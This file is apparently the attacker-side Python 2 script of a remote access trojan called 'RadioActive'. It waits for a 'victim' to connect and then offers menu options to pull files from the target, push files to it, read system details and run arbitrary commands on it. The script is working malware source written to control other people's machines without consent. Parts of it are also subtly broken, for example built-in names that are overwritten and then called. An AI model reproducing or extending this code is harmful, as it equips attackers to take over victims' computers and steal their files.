from socket import *
import os, time, sys
os.system("clear")

ip = raw_input("\033[01;31m[?] \033[00;32mip address\033[01;31m Server >>\033[00;32m ")
port = raw_input("\033[01;31m[?]\033[00;32m Port Server >> \033[01;32m")
s=socket(AF_INET ,SOCK_STREAM)
try:
    s.bind((ip, int(port)))
    s.listen(5)
except:
    print "\033[01;31mPlease try again later, the previous server is active "
    os.system("exit()")
    
print 
print "\033[01;33m[~] The server ran, waiting for the victim to connect... "

client , rnd_port = s.accept()
print 
print "\033[01;32m[!] Someone connected to the server with ip and random port :\033[01;31m "+str(rnd_port)
time.sleep(3)
list = ["10%","25%","46%","\033[00;3278%", "87%", "99%", "100%"]
for i in range(1):
    for i in range(len(list)):
        time.sleep(0.5)
        str = list[i]
        sys.stdout.write("\r" + str)
        sys.stdout.flush()
        time.sleep(0.1)
os.system("clear")
os.system("python ban.py")

def menu():

    print """
		          \033[01;32m RadioActive
	  \033[01;31m [!] We got access from the client! You can get full access to them with the following options as long as the client is connected to us (server). 
		  
		\033[01;31m[0]\033[01;32m Copy files except video and music 
		  
		\033[01;31m[1] \033[01;32mDownload the file from the target system 
		
		\033[01;31m[2]\033[01;32m Upload the file on the target system 
		
		\033[01;31m[3]\033[01;32m Target system specifications
		

	\033[01;31m	Cr :\033[01;32m https://t.me/esfelurm
		
        """
menu()


while True:

	shell = raw_input("\033[01;33m Terminal | | Number >> ")

	if shell == None or shell == '':
		continue

	elif shell == '0': 

		client.sendall(shell)
		nname = raw_input("\033[01;32mfile name > \033[01;31m")
		client.sendall(nname)
		Name = raw_input("\033[01;32mOutput file name >\033[01;31m ")
		client.sendall(Name)
                o = client.recv(129382929)
                print "\033[01;32File copied successfully! "
		

	
	elif shell == '1': 

		client.sendall(shell)
		name = raw_input("\033[01;32mfile Name File >> ")
		client.sendall(name)
		file = open(name , "wb") 
		data = client.recv(1024)
		client.sendall("\033[01;31mRecved len data")
		my_write = str(client.recv(int(data)))
		file.write(my_write)
		file.close()
		print 

	elif shell == '2': 

		client.sendall(shell)
		name = raw_input("\033[01;32file name >>\033[01;31m ")
		client.sendall(name)
		file = open(name , "rb")
		data = buffer(file.read())
		client.sendall(str(len(data)))
		print client.recv(1024)
		client.sendall(data)
		file.close()
		print 

	elif shell == '3': 

		client.sendall(shell)
		sys = client.recv(34464)
		print
		print sys
		print 

	else: 

		client.sendall(shell)

		cmd = client.recv(93454432)

		print cmd
		print 


client.close()


